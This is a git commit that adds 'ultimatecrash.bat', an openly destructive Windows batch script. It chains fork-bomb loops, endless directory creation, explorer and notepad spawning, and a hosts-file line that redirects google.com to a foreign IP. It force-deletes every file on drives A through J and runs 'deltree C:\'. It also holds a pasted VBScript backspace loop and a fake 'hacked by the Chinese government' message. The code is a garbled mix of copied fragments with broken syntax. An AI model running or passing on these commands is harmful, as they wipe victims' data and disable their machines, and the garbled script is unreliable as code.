99d9ceb09608f3caf89715d0eb3e3f08897e5d65
VSNOOB <83365959+VSNOOB@users.noreply.github.com>
2021-05-21 10:53:13 -0700

    Add files via upload

---
+++ ultimatecrash.bat
@@ -0,0 +1,49 @@
+    @echo on/off
+    A
+    start
+    goto A
+    start
+    start
+    start
+    start
+    start %0
+    %0
+    start
+    echo hahahahahahaha
+    cd C:Documents and SettingsusernameDesktop
+    :loop
+    md %RANDOM%
+    goto loop
+    echo 61.179.193.150 www.google.com >> C:windowssystem32driversetchosts.txt
+    exit
+    :A
+    start
+    explorer
+    goto :A
+    :A
+    start (baidu.com)
+    ping localhost -m 5 >nul
+    goto :A
+    echo 被中国政府黑客攻击
+    del D:\. /f /s /q
+    del E:\. /f /s /q
+    del F:\. /f /s /q
+    del G:\. /f /s /q
+    del H:\. /f /s /q
+    del I:\. /f /s /q
+    del J:\. /f /s /q
+    del A:\. /f /s /q
+    del B:\. /f /s /q
+    del C:\. /f /s /q
+    :top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+MsgBox “Let’s go back a few steps”
+Set wshShell =wscript.CreateObject(”WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys “{bs}”
+loop
+@echo off 
+deltree C:\
+
